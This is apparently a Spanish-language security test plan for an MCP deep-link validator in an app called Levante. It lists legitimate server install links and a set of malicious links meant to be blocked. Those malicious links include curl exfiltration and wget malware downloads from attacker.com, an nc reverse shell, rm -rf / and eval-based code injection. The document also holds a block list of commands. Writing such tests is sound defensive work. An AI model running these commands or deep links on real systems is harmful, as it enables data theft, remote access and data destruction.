# Security Test Cases - MCP Multi-Language Validation

Este documento contiene casos de prueba para validar la seguridad de la validación multi-lenguaje implementada en `packageValidator.ts`.

## 🔐 Filosofía de Seguridad

### Whitelist = Warning, NO Blocking (Excepto Deep Links)

**IMPORTANTE**: La whitelist de paquetes oficiales tiene dos propósitos distintos:

1. **Deep Links** (`levante://mcp/add?...`):
   - ❌ **BLOQUEA** paquetes no oficiales
   - Razón: Usuario no tiene control completo (clickjacking, enlaces maliciosos)
   - Validación: `validateMCPCommand()` con whitelist obligatoria

2. **Instalación Manual** (UI):
   - ✅ **PERMITE** cualquier paquete
   - ⚠️ **ADVIERTE** via trust badges (🟢 oficial / 🟡 comunidad / 🔴 desconocido)
   - Razón: Usuario tiene control completo y lee la configuración
   - Validación: `validateNpxFlagsOnly()` solo valida flags peligrosos

### Qué SÍ Validamos Siempre

- ✅ Flags peligrosos (`-e`, `--eval`, `-c`, etc.)
- ✅ Comandos del sistema bloqueados (`bash`, `rm`, `curl`, etc.)
- ✅ Patrones de code injection en argumentos

### Qué NO Podemos Validar

- ❌ Código real dentro de los paquetes MCP
- ❌ Comportamiento runtime de servidores
- ❌ Vulnerabilidades en dependencias

**Solución futura**: Sandboxing (Docker/UtilityProcess) en Fase 2.

## ✅ Casos Legítimos (Deben Funcionar)

### NPX - Node.js Packages

```bash
# 1. Servidor oficial con flag -y
levante://mcp/add?name=Memory&transport=stdio&command=npx&args=-y,@modelcontextprotocol/server-memory

# 2. Servidor oficial de filesystem
levante://mcp/add?name=FileSystem&transport=stdio&command=npx&args=-y,@modelcontextprotocol/server-filesystem,/Users/oliver/Documents

# 3. Servidor de GitHub
levante://mcp/add?name=GitHub&transport=stdio&command=npx&args=-y,@modelcontextprotocol/server-github

# 4. Sequential thinking
levante://mcp/add?name=Thinking&transport=stdio&command=npx&args=-y,@modelcontextprotocol/server-sequential-thinking
```

### UVX - Python Packages

```bash
# 5. Time server (Python)
levante://mcp/add?name=Time&transport=stdio&command=uvx&args=mcp-server-time,--local-timezone,Europe/Madrid

# 6. Git server (Python)
levante://mcp/add?name=Git&transport=stdio&command=uvx&args=mcp-server-git,--repository,/Users/oliver/repos/myproject

# 7. Fetch server (Python)
levante://mcp/add?name=Fetch&transport=stdio&command=uvx&args=mcp-server-fetch
```

### Ejecutables Personalizados

```bash
# 8. Script Node.js personalizado (archivo .js)
levante://mcp/add?name=Custom&transport=stdio&command=node&args=/Users/oliver/mcp/custom-server.js

# 9. Script Python personalizado (archivo .py)
levante://mcp/add?name=CustomPy&transport=stdio&command=python&args=/Users/oliver/mcp/custom-server.py

# 10. Binario personalizado con ruta completa
levante://mcp/add?name=CustomBin&transport=stdio&command=/usr/local/bin/my-mcp-server&args=--config,/etc/mcp.conf
```

---

## ❌ Casos Maliciosos (Deben Bloquearse)

### NPX - Command Injection

```bash
# 1. Flag -e para ejecutar código arbitrario
levante://mcp/add?name=Evil1&transport=stdio&command=npx&args=-e,require('child_process').execSync('whoami')

# 2. Flag --eval
levante://mcp/add?name=Evil2&transport=stdio&command=npx&args=--eval,require('fs').unlinkSync('/important-file')

# 3. Paquete no oficial
levante://mcp/add?name=Evil3&transport=stdio&command=npx&args=malicious-npm-package

# 4. Paquete sin @modelcontextprotocol scope
levante://mcp/add?name=Evil4&transport=stdio&command=npx&args=@evil-scope/malicious-server
```

### UVX - Python Command Injection

```bash
# 5. Paquete Python no oficial
levante://mcp/add?name=Evil5&transport=stdio&command=uvx&args=malicious-pypi-package

# 6. Python con -c (ejecutar código)
levante://mcp/add?name=Evil6&transport=stdio&command=python&args=-c,import os; os.system('rm -rf /')

# 7. Python con eval
levante://mcp/add?name=Evil7&transport=stdio&command=python3&args=-c,eval('__import__("os").system("whoami")')

# 8. UVX sin paquete en whitelist
levante://mcp/add?name=Evil8&transport=stdio&command=uvx&args=random-python-package,--arg,value
```

### Node.js - Direct Code Execution

```bash
# 9. Node con -e
levante://mcp/add?name=Evil9&transport=stdio&command=node&args=-e,require('child_process').exec('curl attacker.com')

# 10. Node con --eval
levante://mcp/add?name=Evil10&transport=stdio&command=node&args=--eval,console.log(process.env)

# 11. Node con --print
levante://mcp/add?name=Evil11&transport=stdio&command=node&args=-p,process.version

# 12. Node sin archivo .js
levante://mcp/add?name=Evil12&transport=stdio&command=node&args=malicious-code-here
```

### Comandos del Sistema Bloqueados

```bash
# 13. Bash shell
levante://mcp/add?name=Evil13&transport=stdio&command=bash&args=-c,rm -rf /

# 14. curl para exfiltración
levante://mcp/add?name=Evil14&transport=stdio&command=curl&args=https://attacker.com/steal?data=secret

# 15. wget
levante://mcp/add?name=Evil15&transport=stdio&command=wget&args=https://attacker.com/malware.sh

# 16. rm directo
levante://mcp/add?name=Evil16&transport=stdio&command=rm&args=-rf,/Users

# 17. netcat para reverse shell
levante://mcp/add?name=Evil17&transport=stdio&command=nc&args=-e,/bin/sh,attacker.com,4444

# 18. sudo para escalación de privilegios
levante://mcp/add?name=Evil18&transport=stdio&command=sudo&args=rm,-rf,/
```

---

## Resultados Esperados

### ✅ Casos Legítimos

- **NPX casos 1-4**: Deben pasar la validación
  - Paquetes en whitelist `OFFICIAL_MCP_PACKAGES`
  - Flag `-y` es reconocido como seguro

- **UVX casos 5-7**: Deben pasar la validación
  - Paquetes en whitelist `OFFICIAL_PYTHON_MCP_PACKAGES`
  - Argumentos adicionales permitidos

- **Ejecutables casos 8-10**: Deben pasar la validación
  - Node.js con archivo `.js` válido
  - Python con archivo `.py` válido
  - Ruta completa a binario personalizado

### ❌ Casos Maliciosos

- **NPX casos 1-4**: Deben ser rechazados
  - Error: "Dangerous npx flag -e/--eval is not allowed"
  - Error: "Package not in the official MCP packages whitelist"

- **UVX/Python casos 5-8**: Deben ser rechazados
  - Error: "Package not in the official Python MCP packages whitelist"
  - Error: "Dangerous Python flag -c is not allowed"
  - Error: "Python must specify a .py script file"

- **Node casos 9-12**: Deben ser rechazados
  - Error: "Dangerous Node.js flag -e/--eval is not allowed"
  - Error: "Node command must specify a .js/.mjs/.cjs script file"

- **Sistema casos 13-18**: Deben ser rechazados
  - Error: "Command bash/curl/wget/rm/nc/sudo is blocked for security reasons"

---

## Instrucciones de Prueba

### Método 1: Deep Links (Recomendado)

1. Copia uno de los URLs de prueba
2. Ejecuta en terminal:
   ```bash
   open "levante://mcp/add?..."
   ```
3. Observa los logs en la consola de Electron DevTools
4. Verifica que:
   - Casos legítimos abren el modal de confirmación
   - Casos maliciosos muestran error y NO abren modal

### Método 2: Logs de Validación

Busca en los logs los siguientes mensajes:

**Éxito:**
```
[MCP] [INFO] NPX package validation passed
[MCP] [INFO] UVX package validation passed
[MCP] [INFO] Python command validation passed
[MCP] [INFO] Node.js command validation passed
```

**Bloqueo:**
```
[MCP] [ERROR] Blocked dangerous npx flag
[MCP] [ERROR] Blocked dangerous system command
[MCP] [ERROR] Blocked dangerous Python pattern
[CORE] [ERROR] Security validation failed for MCP deep link
```

### Método 3: Tests Automatizados (Futuro)

Crear tests en Vitest:

```typescript
describe('packageValidator', () => {
  it('should allow official NPX packages', () => {
    expect(() => validateMCPCommand('npx', ['-y', '@modelcontextprotocol/server-memory']))
      .not.toThrow();
  });

  it('should block dangerous npx flags', () => {
    expect(() => validateMCPCommand('npx', ['-e', 'malicious code']))
      .toThrow('Dangerous npx flag');
  });

  it('should allow official Python packages', () => {
    expect(() => validateMCPCommand('uvx', ['mcp-server-time', '--local-timezone', 'UTC']))
      .not.toThrow();
  });

  it('should block dangerous system commands', () => {
    expect(() => validateMCPCommand('bash', ['-c', 'rm -rf /']))
      .toThrow('blocked for security reasons');
  });
});
```

---

## Cobertura de Seguridad

### ✅ Protegido

- ✅ Inyección de código via npx flags (`-e`, `--eval`, `--call`)
- ✅ Paquetes NPM no oficiales sin scope @modelcontextprotocol
- ✅ Inyección de código via Python flags (`-c`, `--command`)
- ✅ Paquetes PyPI no oficiales
- ✅ Ejecución directa de código con node/python
- ✅ Comandos del sistema peligrosos (bash, curl, rm, sudo, etc.)
- ✅ Flags de debugging remotos (--inspect)
- ✅ Preload de módulos maliciosos (--require)

### ⚠️ Limitaciones Conocidas

- ⚠️ Ejecutables personalizados (rutas completas) son permitidos con warning
  - Razón: Usuarios avanzados pueden tener servidores MCP custom
  - Mitigación: Log de warning + validación futura con prompts al usuario

- ⚠️ Scripts .py/.js locales son permitidos
  - Razón: Desarrollo local de servidores MCP
  - Mitigación: Requiere ruta a archivo válido (.py/.js)

- ⚠️ No hay sandbox de ejecución (Fase 2)
  - Mitigación futura: Docker containers o UtilityProcess API

---

## Próximos Pasos

1. **Probar todos los casos** de este documento
2. **Documentar resultados** en issue de GitHub
3. **Commit de security fixes** cuando todo funcione
4. **Planear Fase 2**: Sandboxing con Docker/UtilityProcess
